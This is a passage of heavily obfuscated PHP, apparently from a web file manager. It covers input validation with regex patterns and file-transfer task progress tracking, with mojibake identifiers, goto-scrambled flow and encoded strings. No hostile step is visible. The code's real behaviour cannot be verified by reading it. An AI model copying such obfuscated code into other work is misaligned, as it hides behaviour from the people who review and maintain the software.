$DÛ°­æ‡â„; if (isset($Añ²…‚£ô£[$Aæ‹½¶[1874]]) && $Añ²…‚£ô£[$Aæ‹½¶[1874]]) { $Eö¨¡ù‘¤ = $Añ²…‚£ô£[$Aæ‹½¶[1874]]; } goto bèé¨†‘ï; bèé¨†‘ï: if (!array_key_exists($DÛ°­æ‡â„, $in)) { if (array_key_exists($Aæ‹½¶[1875], $Añ²…‚£ô£)) { if (!is_null($Añ²…‚£ô£[$Aæ‹½¶[1875]])) { $CŸ˜‘ÍÇ­¥[$Eö¨¡ù‘¤] = $Añ²…‚£ô£[$Aæ‹½¶[1875]]; } } else { if (isset($Añ²…‚£ô£[$Aæ‹½¶[1876]])) { $F­ÙÍ¦‚Î[] = $cšç¢ ¼¼î; } } continue; } if (isset($Añ²…‚£ô£[$Aæ‹½¶[1876]]) && $Añ²…‚£ô£[$Aæ‹½¶[1876]] == $Aæ‹½¶[282]) { $b­É‡¯­Ÿ‚ = json_decode($in[$DÛ°­æ‡â„], !0); if (is_array($b­É‡¯­Ÿ‚)) { $CŸ˜‘ÍÇ­¥[$Eö¨¡ù‘¤] = $b­É‡¯­Ÿ‚; } else { if (array_key_exists($Aæ‹½¶[1875], $Añ²…‚£ô£)) { if (!is_null($Añ²…‚£ô£[$Aæ‹½¶[1875]])) { $CŸ˜‘ÍÇ­¥[$Eö¨¡ù‘¤] = $Añ²…‚£ô£[$Aæ‹½¶[1875]]; } } else { $F­ÙÍ¦‚Î[] = $cšç¢ ¼¼î; } } continue; } $cˆ“º¿î¤† = _get($Añ²…‚£ô£, $Aæ‹½¶[1010]); goto DîŞ¼Šøœ; e‚‡ÊÈ×Á: } goto B³ÖùÆ†ÉÆ; aí±Œ’ê©À: $Aæ‹½¶ =& $_SERVER[í…¶]; global $in; $CŸ˜‘ÍÇ­¥ = array(); goto c°„İŒ½ó‘; Cœë«¶Ù§¥: } public static function reg($c†ÅŠğä ˆ = "\162\x65\x71\165\x69\x72\x65") { static $EÇŒ¹©ÁŞ = array("\162\x65\161\165\151\x72\145" => "\x2e\53", "\x6e\x75\x6d\142\x65\x72" => "\134\144\53", "\150\145\170" => "\x5b\60\55\71\x41\x2d\x46\141\x2d\x66\x5d\53", "\151\156\164" => "\x5b\55\x5c\x2b\135\x3f\x5c\x64\53", "\x62\x6f\x6f\154" => "\x30\174\61", "\146\154\157\x61\x74" => "\x5b\x2d\134\x2b\x5d\77\x5c\x64\53\x28\134\x2e\x5c\144\53\x29\77", "\145\156\x67\x6c\151\x73\150" => "\x5b\x41\55\132\141\55\x7a\x20\x5d\53", "\143\150\151\x6e\145\x73\x65" => "\133\x5c\x78\173\64\x65\x30\60\175\55\134\x78\x7b\71\146\x61\x35\x7d\x5d\53", "\x68\141\x73\103\150\151\x6e\x65\163\x65" => "\x2f\x28\133\134\170\x7b\x34\x65\x30\x30\175\55\134\x78\173\x39\146\x61\x35\x7d\x5d\x2b\x29\x2f\x75", "\x65\155\141\x69\154" => "\x5c\167\53\50\133\x5c\56\x5c\x2d\135\x5c\167\x2b\51\52\x5c\x40\x5c\167\x2b\50\x5b\134\56\x5c\55\135\x5c\167\53\x29\x2a\134\x2e\x5c\167\53", "\x70\150\x6f\156\x65" => "\x31\x5b\63\x2d\x39\135\x5c\x64\x7b\71\x7d", "\x74\145\154\160\150\157\156\145" => "\50\x5c\50\x5c\144\x7b\x33\x2c\x34\x7d\134\51\174\134\x64\x7b\63\54\64\x7d\x2d\x7c\x5c\163\x29\77\134\144\x7b\x37\54\x31\x34\x7d", "\x75\162\x6c" => "\x28\150\164\x74\x70\x7c\x66\164\160\x7c\x68\164\x74\160\163\x29\72\x5c\57\x5c\x2f\133\x5c\x77\x5c\x2d\x5f\x5d\x2b\50\134\56\x5b\x5c\167\x5c\55\137\x5d\x2b\51\x2b\50\133\x5c\167\x5c\55\x5c\56\54\100\x3f\x5e\x3d\45\46\72\134\57\176\134\x2b\x23\135\x2a\133\134\167\134\x2d\134\100\x3f\x5e\x3d\45\x26\x5c\x2f\176\134\x2b\43\x5d\51\x3f", "\x75\x72\x6c\106\x75\x6c\154" => "\x5b\141\x2d\172\101\55\172\x5d\x2b\72\x5c\x2f\x5c\57\133\x5e\x5c\x73\x5d\52", "\x69\x70" => "\x28\x5c\144\x7b\x31\x2c\63\x7d\x5c\x2e\51\x7b\x33\x7d\x28\x5c\x64\173\x31\54\63\175\51", "\172\151\x70" => "\x5b\x31\55\71\135\134\144\x7b\65\175\50\x3f\41\x5c\144\x29", "\x69\x64\103\141\x72\144" => "\x28\134\144\x7b\x31\65\175\x29\x7c\50\134\x64\173\61\67\x7d\x28\x5c\x64\x7c\x58\174\170\51\51", "\143\157\154\x6f\162" => "\43\x28\x5b\60\x2d\71\101\x2d\x46\141\x2d\146\x5d\x7b\x33\175\174\133\60\55\x39\101\x2d\x46\141\55\x66\x5d\x7b\x36\x7d\x29", "\x74\x69\155\145" => "\50\133\x30\55\x31\135\134\x64\x7c\62\x5b\x30\x2d\x34\135\51\x3a\133\60\55\x35\x5d\x5c\x64", "\144\141\164\145" => "\x5c\x64\x7b\64\x7d\x5b\55\134\x2f\135\x3f\50\x30\133\61\x2d\x39\135\x7c\61\133\x30\x2d\62\x5d\51\133\55\x5c\x2f\x5d\x3f\50\x5b\x30\x2d\x32\x5d\x5c\x64\x7c\63\133\60\x2d\x31\x5d\x29", "\144\x61\164\x65\x54\151\x6d\x65" => "\134\144\x7b\64\175\x5b\55\x5c\x2f\135\x3f\x28\x30\133\x31\x2d\x39\x5d\174\x31\x5b\60\55\62\x5d\51\133\55\x5c\57\135\x3f\x28\133\x30\55\62\135\134\x64\x7c\x33\133\60\x2d\x31\x5d\x29\134\x73\x2b\50\x5b\x30\55\61\x5d\134\x64\x7c\x32\133\60\x2d\64\135\x29\72\x5b\x30\x2d\65\x5d\x5c\144", "\x70\x61\163\x73\167\157\162\144" => "\x28\x3f\75\56\x2a\x5c\144\51\50\77\x3d\x2e\x2a\x5b\x61\55\x7a\x5d\51\x28\77\x3d\56\52\133\x41\55\x5a\135\51\56\x7b\x38\x2c\62\60\x7d", "\x6b\x65\171" => "\133\x41\x2d\132\x61\55\172\x30\x2d\x39\x5f\x5c\x2d\x5c\x2e\135\53", "\153\145\171\x46\165\154\x6c" => "\x5b\x41\55\132\141\55\x7a\x30\55\x39\137\x5c\55\x5c\56\134\x73\x2c\x5d\53"); if (!$c†ÅŠğä ˆ) { return $EÇŒ¹©ÁŞ; } return $EÇŒ¹©ÁŞ[$c†ÅŠğä ˆ]; } public static function check($dÜÖê°ˆÆŞ, $e—«•¾†ù, $a®ò¨ºÅ = null) { $Fõ‘Œ»Ş‹ñ =& $_SERVER[í…¶]; switch ($e—«•¾†ù) { case $Fõ‘Œ»Ş‹ñ[7]: return in_array($dÜÖê°ˆÆŞ, $a®ò¨ºÅ); break; case $Fõ‘Œ»Ş‹ñ[1878]: return floatval($dÜÖê°ˆÆŞ) > $a®ò¨ºÅ; break; case $Fõ‘Œ»Ş‹ñ[1879]: return floatval($dÜÖê°ˆÆŞ) < $a®ò¨ºÅ; break; case $Fõ‘Œ»Ş‹ñ[325]: return strlen($dÜÖê°ˆÆŞ) >= $a®ò¨ºÅ[0] && strlen($dÜÖê°ˆÆŞ) <= $a®ò¨ºÅ[1]; break; case $Fõ‘Œ»Ş‹ñ[325]: if (is_array($a®ò¨ºÅ)) { return strlen($dÜÖê°ˆÆŞ) >= $a®ò¨ºÅ[0] && strlen($dÜÖê°ˆÆŞ) <= $a®ò¨ºÅ[1]; break; } else { return strlen($dÜÖê°ˆÆŞ) == $a®ò¨ºÅ; break; } case $Fõ‘Œ»Ş‹ñ[321]: return floatval($dÜÖê°ˆÆŞ) >= $a®ò¨ºÅ[0] && floatval($dÜÖê°ˆÆŞ) <= $a®ò¨ºÅ[1]; break; } $E†ëˆ¬¨î¶ = self::reg(!1); $e—«•¾†ù = isset($E†ëˆ¬¨î¶[$e—«•¾†ù]) ? $E†ëˆ¬¨î¶[$e—«•¾†ù] : $e—«•¾†ù; if (substr($e—«•¾†ù, 0, 1) != $Fõ‘Œ»Ş‹ñ[8]) { $e—«•¾†ù = $Fõ‘Œ»Ş‹ñ[1880] . $e—«•¾†ù . $Fõ‘Œ»Ş‹ñ[1881]; } return preg_match($e—«•¾†ù, $dÜÖê°ˆÆŞ) === 1; } public static function get($eÉù ÙÙõŸ, $Bµå»òªÄ¹ = null, $EåÒ” áÅ¸ = null, $c®ŒÒÂÓ‰ö = null) { goto aÅÀ©™·±”; fºáŠ¢»Û: return $a¬ÖÌ¹»¿é[$eÉù ÙÙõŸ]; goto E¶Ô…ªÕƒ‡; aÅÀ©™·±”: $FˆÎàóÈªó =& $_SERVER[í…¶]; $A¡Ô‚‰ƒ = array(); if (!is_null($EåÒ” áÅ¸)) { $A¡Ô‚‰ƒ[$FˆÎàóÈªó[34]] = $EåÒ” áÅ¸; } goto f‚¼ÒÂ¨ˆ; f‚¼ÒÂ¨ˆ: if (!is_null($c®ŒÒÂÓ‰ö)) { $A¡Ô‚‰ƒ[$FˆÎàóÈªó[1010]] = $c®ŒÒÂÓ‰ö; } if (!is_null($Bµå»òªÄ¹)) { $A¡Ô‚‰ƒ[$FˆÎàóÈªó[1876]] = $Bµå»òªÄ¹; } $a¬ÖÌ¹»¿é = Input::getArray(array($eÉù ÙÙõŸ => $A¡Ô‚‰ƒ)); goto fºáŠ¢»Û; E¶Ô…ªÕƒ‡: } } goto CÖİ‘øÒš; BãºŞØ°Ó: class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\x69\x6e\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($c§ŠØ¯õ, $c™ŒÛæÌÉ› = '', $dÁ²ÓßŠ©„ = 0, $D×»Ø¶¹Ì† = '') { goto AÈÅ÷·ØÌè; bâƒ¹ßŒâÇ: Hook::bind($B·ê˜®¸§‡[1399], array($this, $B·ê˜®¸§‡[1441])); Hook::bind($B·ê˜®¸§‡[1442], array($this, $B·ê˜®¸§‡[1443])); $this->startAfter(); goto aÒÆÈÄ¾Å‘; AÈÅ÷·ØÌè: $B·ê˜®¸§‡ =& $_SERVER[í…¶]; if (self::get($c§ŠØ¯õ)) { return; } $this->task = array($B·ê˜®¸§‡[376] => $c§ŠØ¯õ, $B·ê˜®¸§‡[1433] => USER_ID, $B·ê˜®¸§‡[1339] => $D×»Ø¶¹Ì†, $B·ê˜®¸§‡[29] => $c™ŒÛæÌÉ›, $B·ê˜®¸§‡[976] => $B·ê˜®¸§‡[33], $B·ê˜®¸§‡[974] => $dÁ²ÓßŠ©„, $B·ê˜®¸§‡[988] => 0, $B·ê˜®¸§‡[1434] => 0, $B·ê˜®¸§‡[1435] => 0, $B·ê˜®¸§‡[1436] => timeFloat(), $B·ê˜®¸§‡[1437] => 0, $B·ê˜®¸§‡[1438] => 0, $B·ê˜®¸§‡[1439] => 0, $B·ê˜®¸§‡[1440] => 0, $B·ê˜®¸§‡[691] => $B·ê˜®¸§‡[1397]); goto bâƒ¹ßŒâÇ; aÒÆÈÄ¾Å‘: Hook::trigger($B·ê˜®¸§‡[1444], $this->task); $this->task[$B·ê˜®¸§‡[1438]] = timeFloat(); goto BĞ‘ÚÖ‹·Ş; BĞ‘ÚÖ‹·Ş: } public function end() { goto A¼·ƒ›ñ§Ò; C˜œ¾ã·ğ: Hook::unbind($E‚î®ÌîÊ[1442], array($this, $E‚î®ÌîÊ[1443])); $this->endAfter(); $this->task = !1; goto cµºâÁ‰½‰; CùƒĞŠèÚï: $CÎ÷çœƒŞ = timeFloat() - $this->task[$E‚î®ÌîÊ[1436]]; self::log($E‚î®ÌîÊ[1445] . $this->task[$E‚î®ÌîÊ[376]] . $E‚î®ÌîÊ[1446] . $CÎ÷çœƒŞ . $E‚î®ÌîÊ[1447]); Hook::unbind($E‚î®ÌîÊ[1399], array($this, $E‚î®ÌîÊ[1441])); goto C˜œ¾ã·ğ; A¼·ƒ›ñ§Ò: $E‚î®ÌîÊ =& $_SERVER[í…¶]; if (!$this->task) { return; } if ($this->task[$E‚î®ÌîÊ[1438]]) { self::valueSet($this->task[$E‚î®ÌîÊ[376]], !1); } goto CùƒĞŠèÚï; cµºâÁ‰½‰: } public function update($e¡¤ÃŸ¾˜ = 0) { goto cÆÛ™¥Ï; CµŠ”ØÏˆˆ: $this->updateAfter(); $b¶…‚­ºİ¯ = 0.2; if (timeFloat() - $d•ùè»Õİ¨[$fîèÅçêÓÊ[1438]] < $b¶…‚­ºİ¯) { return; } goto dÉé£Ú‰ê±; D˜ŞÕÌñŒá: Hook::trigger($fîèÅçêÓÊ[1451], $d•ùè»Õİ¨); self::valueSet($d•ùè»Õİ¨[$fîèÅçêÓÊ[376]], $d•ùè»Õİ¨); goto aâ´ÅˆŠÛ–; c½ëÙ¡šÂ¥: $d•ùè»Õİ¨[$fîèÅçêÓÊ[691]] = $C±½Î†£¨ ? $C±½Î†£¨ : $d•ùè»Õİ¨[$fîèÅçêÓÊ[691]]; $d•ùè»Õİ¨[$fîèÅçêÓÊ[1439]] = $F¯Ê×àğøç[$fîèÅçêÓÊ[1439]] ? $F¯Ê×àğøç[$fîèÅçêÓÊ[1439]] : 0; $d•ùè»Õİ¨[$fîèÅçêÓÊ[1438]] = timeFloat(); goto D˜ŞÕÌñŒá; dÉé£Ú‰ê±: $F¯Ê×àğøç = self::get($d•ùè»Õİ¨[$fîèÅçêÓÊ[376]]); $C±½Î†£¨ = $F¯Ê×àğøç[$fîèÅçêÓÊ[691]]; if ($C±½Î†£¨ == self::STATYS_KILL) { $e˜å¼ÂƒÙ = array($fîèÅçêÓÊ[1448] => LNG($fîèÅçêÓÊ[1449]), $fîèÅçêÓÊ[1030] => !1); Cache::set($fîèÅçêÓÊ[1450] . $this->task[$fîèÅçêÓÊ[376]], $e˜å¼ÂƒÙ, 30); $this->end(); die; } else { if ($C±½Î†£¨ == self::STATYS_STOP) { $e†¦ƒÅ­ = 2; $F¯Ê×àğøç[$fîèÅçêÓÊ[1439]] += $e†¦ƒÅ­; self::valueSet($d•ùè»Õİ¨[$fîèÅçêÓÊ[376]], $F¯Ê×àğøç); sleep($e†¦ƒÅ­); $this->update(); return; } } goto c½ëÙ¡šÂ¥; cÆÛ™¥Ï: $fîèÅçêÓÊ =& $_SERVER[í…¶]; $d•ùè»Õİ¨ =& $this->task; if (!$d•ùè»Õİ¨) { return; } goto BŠŠ¶¿®‰; BŠŠ¶¿®‰: $d•ùè»Õİ¨[$fîèÅçêÓÊ[988]] += $e¡¤ÃŸ¾˜; $d•ùè»Õİ¨[$fîèÅçêÓÊ[1437]] = timeFloat(); if ($d•ùè»Õİ¨[$fîèÅçêÓÊ[974]]) { if ($d•ùè»Õİ¨[$fîèÅçêÓÊ[974]] < $d•ùè»Õİ¨[$fîèÅçêÓÊ[988]]) { $d•ùè»Õİ¨[$fîèÅçêÓÊ[974]] = $d•ùè»Õİ¨[$fîèÅçêÓÊ[988]]; } $DŸÈ¦ÒÑÎ¹ = timeFloat() - $d•ùè»Õİ¨[$fîèÅçêÓÊ[1436]] - $d•ùè»Õİ¨[$fîèÅçêÓÊ[1439]]; $d•ùè»Õİ¨[$fîèÅçêÓÊ[1434]] = $d•ùè»Õİ¨[$fîèÅçêÓÊ[988]] / $d•ùè»Õİ¨[$fîèÅçêÓÊ[974]]; $d•ùè»Õİ¨[$fîèÅçêÓÊ[1435]] = $d•ùè»Õİ¨[$fîèÅçêÓÊ[988]] / $DŸÈ¦ÒÑÎ¹; if ($d•ùè»Õİ¨[$fîèÅçêÓÊ[1434]] > 0) { $d•ùè»Õİ¨[$fîèÅçêÓÊ[1440]] = $DŸÈ¦ÒÑÎ¹ * (1 - $d•ùè»Õİ¨[$fîèÅçêÓÊ[1434]]) / $d•ùè»Õİ¨[$fîèÅçêÓÊ[1434]]; } $d•ùè»Õİ¨[$fîèÅçêÓÊ[1440]] = $d•ùè»Õİ¨[$fîèÅçêÓÊ[1440]] <= 0 ? 0 : $d•ùè»Õİ¨[$fîèÅçêÓÊ[1440]]; } goto CµŠ”ØÏˆˆ; aâ´ÅˆŠÛ–: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Bµô«ö›) { $dŒ«Íß«›ï =& $_SERVER[í…¶]; Cache::set($dŒ«Íß«›ï[1450] . $this->task[$dŒ«Íß«›ï[376]], $Bµô«ö›, 60); return $Bµô«ö›; } public static function get($Dí˜³Œ±¡ô) { return self::valueGet($Dí˜³Œ±¡ô); } public static function listData() { $AšŒŸÔ¦²Õ = self::valueGet(); return array_sort_by($AšŒŸÔ¦²Õ, $_SERVER[í…¶][1436], !0); } public static function kill($Bƒ÷‰¨) { return self::changeStatus($Bƒ÷‰¨, self::STATYS_KILL); } public static function stop($fôßÀÎñ”) { return self::changeStatus($fôßÀÎñ”, self::STATYS_STOP); } public static function restart($aˆŒ‰åâÆ) { return self::changeStatus($aˆŒ‰åâÆ, self::STATYS_RUNNING); } public static function killAll() { $dÀ–ÇÂÊŒ· =& $_SERVER[í…¶]; $cÅñù…®ù = self::listData(); foreach ($cÅñù…®ù as $dÙˆïñæ›Ğ) { self::kill($dÙˆïñæ›Ğ[$dÀ–ÇÂÊŒ·[376]]); } sleep(2); foreach ($cÅñù…®ù as $dÙˆïñæ›Ğ) { self::valueSet($dÙˆïñæ›Ğ[$dÀ–ÇÂÊŒ·[376]], !1); } } private static function changeStatus($E±‡¸° —©, $b ‰Â†šó) { goto Eáß•©å×Ú; Eáß•©å×Ú: $EùÖÕ»ƒ =& $_SERVER[í…¶]; $c¸ò“¹ùØ = self::valueGet($E±‡¸° —©); if (!$c¸ò“¹ùØ) { return !1; } goto FÉà³¨¾¼Í; FÉà³¨¾¼Í: $c¸ò“¹ùØ[$EùÖÕ»ƒ[691]] = $b ‰Â†šó; self::valueSet($E±‡¸° —©, $c¸ò“¹ùØ); self::log($EùÖÕ»ƒ[1452] . $c¸ò“¹ùØ[$EùÖÕ»ƒ[376]] . $EùÖÕ»ƒ[1453] . $b ‰Â†šó); goto bİˆˆÒÍ²é; bİˆˆÒÍ²é: return !0; goto a¾œí†«Âæ; a¾œí†«Âæ: } public static function valueGet($c«Ğ¿¼ äÆ = false) { $f“öáíÓÛ =& $_SERVER[í…¶]; if ($c«Ğ¿¼ äÆ) { $A“ÆÀÊ¶¼ = Model($f“öáíÓÛ[408])->where(array($f“öáíÓÛ[89] => $c«Ğ¿¼ äÆ, $f“öáíÓÛ[29] => $f“öáíÓÛ[1454]))->find(); return $A“ÆÀÊ¶¼ ? json_decode($A“ÆÀÊ¶¼[$f“öáíÓÛ[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($cÊñ ¤–Æ‡ = false) { goto C²ø¢¹¬¯Ä; cìî¶¬ö¢†: return $Dêàéâ¡’â; goto E™ÜÙ»ÄŠº; C²ø¢¹¬¯Ä: $c²ãÁçÃËÖ =& $_SERVER[í…¶]; $CÀíä¶áƒ = array($c²ãÁçÃËÖ[29] => $c²ãÁçÃËÖ[1454]); if ($cÊñ ¤–Æ‡) { $CÀíä¶áƒ[$c²ãÁçÃËÖ[1433]] = $cÊñ ¤–Æ‡; } goto a½à‰°™À”; a½à‰°™À”: $Dêàéâ¡’â = Model($c²ãÁçÃËÖ[408])->where($CÀíä¶áƒ)->select(); $Dêàéâ¡’â = $Dêàéâ¡’â ? $Dêàéâ¡’â : array(); foreach ($Dêàéâ¡’â as $dœ„‚…‡¢ => $Ağ„ªªµóª) { $Dêàéâ¡’â[$dœ„‚…‡¢] = json_decode($Ağ„ªªµóª[$c²ãÁçÃËÖ[368]], !0); } goto cìî¶¬ö¢†; E™ÜÙ»ÄŠº: } public static function valueSet($b©‰øâé, $E¸‘¬çÂäˆ) { goto Aù¿Ğ‘âœÏ; Aù¿Ğ‘âœÏ: $b¥áèÈØ‘Ã =& $_SERVER[í…¶]; if (!$E¸‘¬çÂäˆ) { return Model($b¥áèÈØ‘Ã[408])->where(array($b¥áèÈØ‘Ã[89] => $b©‰øâé, $b¥áèÈØ‘Ã[29] => $b¥áèÈØ‘Ã[1454]))->delete(); } $eµÊ´Ó¹ìï = json_encode($E¸‘¬çÂäˆ); goto cÕªÜ…º†Ü; E«Šµ¯Õö: Model($b¥áèÈØ‘Ã[408])->add($aô‚Œ‡˜İ´, array(), !0); goto f™‰ „Ø§•; cÕªÜ…º†Ü: if (!$eµÊ´Ó¹ìï) { ob_start(); var_dump($E¸‘¬çÂäˆ); $Bá•åó¶º¦ = ob_get_clean(); self::log($b¥áèÈØ‘Ã[1455] . json_encode_force($Bá•åó¶º¦)); } if (!$b©‰øâé || !$E¸‘¬çÂäˆ[$b¥áèÈØ‘Ã[376]]) { return !1; } $aô‚Œ‡˜İ´ = array($b¥áèÈØ‘Ã[29] => $b¥áèÈØ‘Ã[1454], $b¥áèÈØ‘Ã[1433] => USER_ID, $b¥áèÈØ‘Ã[89] => $b©‰øâé, $b¥áèÈØ‘Ã[368] => $eµÊ´Ó¹ìï); goto E«Šµ¯Õö; f™‰ „Ø§•: } public static function log($b§š»¿ª•) { write_log($b§š»¿ª•, $_SERVER[í…¶][1456]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto eÜ•¾¶©Í¡; e¥êò“éĞ¡: $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1482]] = 0; $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1483]] = 0; if (!$C×Í‘äÜ×Ä[$D›±¬­Å¯³[1339]]) { $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1339]] = LNG($D›±¬­Å¯³[1484]); } goto BîÃˆìé•¬; DĞŸ…âõÃ¤: Hook::bind($D›±¬­Å¯³[520], array($this, $D›±¬­Å¯³[1466])); Hook::bind($D›±¬­Å¯³[522], array($this, $D›±¬­Å¯³[1466])); Hook::bind($D›±¬­Å¯³[524], array($this, $D›±¬­Å¯³[1466])); goto f©ïŠ©»; C§‚¸Ïà¼: Hook::bind($D›±¬­Å¯³[1470], array($this, $D›±¬­Å¯³[1471])); Hook::bind($D›±¬­Å¯³[1472], array($this, $D›±¬­Å¯³[1473])); Hook::bind($D›±¬­Å¯³[1474], array($this, $D›±¬­Å¯³[1475])); goto e‡”¥âÃ´Œ; FÊ¨ßõµ”Ê: Hook::bind($D›±¬­Å¯³[548], array($this, $D›±¬­Å¯³[1463])); Hook::bind($D›±¬­Å¯³[549], array($this, $D›±¬­Å¯³[1464])); Hook::bind($D›±¬­Å¯³[551], array($this, $D›±¬­Å¯³[1465])); goto B£Š˜¥¥¤; f©ïŠ©»: Hook::bind($D›±¬­Å¯³[1467], array($this, $D›±¬­Å¯³[1468])); Hook::bind($D›±¬­Å¯³[541], array($this, $D›±¬­Å¯³[1469])); $this->sourceModelCopyFlag = !1; goto C§‚¸Ïà¼; B£Š˜¥¥¤: Hook::bind($D›±¬­Å¯³[552], array($this, $D›±¬­Å¯³[1465])); Hook::bind($D›±¬­Å¯³[518], array($this, $D›±¬­Å¯³[1466])); Hook::bind($D›±¬­Å¯³[515], array($this, $D›±¬­Å¯³[1466])); goto DĞŸ…âõÃ¤; B‚Ôœ«ò¶¬: Hook::bind($D›±¬­Å¯³[1457], array($this, $D›±¬­Å¯³[1458])); Hook::bind($D›±¬­Å¯³[1459], array($this, $D›±¬­Å¯³[1460])); Hook::bind($D›±¬­Å¯³[1461], array($this, $D›±¬­Å¯³[1462])); goto FÊ¨ßõµ”Ê; eÜ•¾¶©Í¡: $D›±¬­Å¯³ =& $_SERVER[í…¶]; $C×Í‘äÜ×Ä =& $this->task; $this->sourceCopyFolder = !1; goto B‚Ôœ«ò¶¬; F›æ­…ó­î: $C×Í‘äÜ×Ä[$D›±¬­Å¯³[976]] = $D›±¬­Å¯³[33]; $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1480]] = $D›±¬­Å¯³[33]; $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1481]] = 0; goto e¥êò“éĞ¡; e‡”¥âÃ´Œ: $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1476]] = LNG($D›±¬­Å¯³[1477]); $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1478]] = 0; $C×Í‘äÜ×Ä[$D›±¬­Å¯³[1479]] = 0; goto F›æ­…ó­î; BîÃˆìé•¬: } protected function endAfter() { goto a­Í°ê–À; BÓŒ­“¥ìŞ: Hook::unbind($D…Û“·§ñ[1470], array($this, $D…Û“·§ñ[1471])); Hook::unbind($D…Û“·§ñ[1472], array($this, $D…Û“·§ñ[1473])); Hook::unbind($D…Û“·§ñ[1474], array($this, $D…Û“·§ñ[1475])); goto a·–ç¦„ŞŞ; AÃ½ù…Ş¦÷: Hook::unbind($D…Û“·§ñ[515], array($this, $D…Û“·§ñ[1466])); Hook::unbind($D…Û“·§ñ[520], array($this, $D…Û“·§ñ[1466])); Hook::unbind($D…Û“·§ñ[522], array($this, $D…Û“·§ñ[1466])); goto eœÒ‘‚ğôğ; eœÒ‘‚ğôğ: Hook::unbind($D…Û“·§ñ[524], array($this, $D…Û“·§ñ[1466])); Hook::unbind($D…Û“·§ñ[1467], array($this, $D…Û“·§ñ[1468])); Hook::unbind($D…Û“·§ñ[541], array($this, $D…Û“·§ñ[1469])); goto BÓŒ­“¥ìŞ; b©ÃĞÒØ“ö: Hook::unbind($D…Û“·§ñ[1461], array($this, $D…Û“·§ñ[1462])); Hook::unbind($D…Û“·§ñ[548], array($this, $D…Û“·§ñ[1463])); Hook::unbind($D…Û“·§ñ[549], array($this, $D…Û“·§ñ[1464])); goto fÉš·¿¿Ñà; fÉš·¿¿Ñà: Hook::unbind($D…Û“·§ñ[551], array($this, $D…Û“·§ñ[1465])); Hook::unbind($D…Û“·§ñ[552], array($this, $D…Û“·§ñ[1465])); Hook::unbind($D…Û“·§ñ[518], array($this, $D…Û“·§ñ[1466])); goto AÃ½ù…Ş¦÷; a­Í°ê–À: $D…Û“·§ñ =& $_SERVER[í…¶]; Hook::unbind($D…Û“·§ñ[1457], array($this, $D…Û“·§ñ[1458])); Hook::unbind($D…Û“·§ñ[1459], array($this, $D…Û“·§ñ[1460])); goto b©ÃĞÒØ“ö; a·–ç¦„ŞŞ: } public function copyMoveStart($cË‡óôã‹§, $C‚«¸Û¯¢, $eÑä½éÍ¯, $cÑ¨·…­²±) { goto a¿ì™Š¸¯å; e¬íÆ‘§: $a¼ŒÍ‚¹„ß[$f¬Àäé–ë[1486]] = KodIO::transferType($cË‡óôã‹§, $eÑä½éÍ¯); $this->update(); goto eá¥«è„Û—; a¿ì™Š¸¯å: $f¬Àäé–ë =& $_SERVER[í…¶]; self::log($f¬Àäé–ë[1485] . $C‚«¸Û¯¢ . $f¬Àäé–ë[66] . $cÑ¨·…­²±); $a÷ ì¢±­ = rtrim(TEMP_FILES, $f¬Àäé–ë[8]); goto B‘„ÒöŠÎ; B‘„ÒöŠÎ: if (substr($C‚«¸Û¯¢, 0, strlen($a÷ ì¢±­)) == $a÷ ì¢±­) { return; } if (substr($cÑ¨·…­²±, 0, strlen($a÷ ì¢±­)) == $a÷ ì¢±­) { return; } $a¼ŒÍ‚¹„ß =& $this->task; goto e¬íÆ‘§; eá¥«è„Û—: } public function updateAfter() { goto eÇ‘•£×ä; eÇ‘•£×ä: $b‹ò‚¯£‰Ï =& $_SERVER[í…¶]; $FØÜµ™·ô° =& $this->task; if (!$FØÜµ™·ô°[$b‹ò‚¯£‰Ï[700]]) { return; } goto B÷ˆ±ºĞ°µ; B÷ˆ±ºĞ°µ: if ($this->sourceModelCopyFlag) { return; } if ($FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1486]] == $b‹ò‚¯£‰Ï[1092]) { return; } if ($FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1486]] == $b‹ò‚¯£‰Ï[1038] || $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1486]] == $b‹ò‚¯£‰Ï[103]) { if ($FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1480]]) { $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1483]] = $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1482]] + $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1479]]; } } else { if ($FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1486]] == $b‹ò‚¯£‰Ï[1093]) { if ($FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1480]] == $b‹ò‚¯£‰Ï[1038]) { $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1483]] = $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1482]] + $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1479]] * 0.5; } else { if ($FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1480]] == $b‹ò‚¯£‰Ï[103]) { $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1483]] = $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1482]] + $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1478]] * 0.5 + $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1479]] * 0.5; } } } } goto E¥Œ¢‰Òø; E¥Œ¢‰Òø: $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1434]] = $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1483]] / $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[700]]; if ($FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1434]] > 0) { $eì…ëÛÎ· = timeFloat() - $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1436]] - $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1439]]; 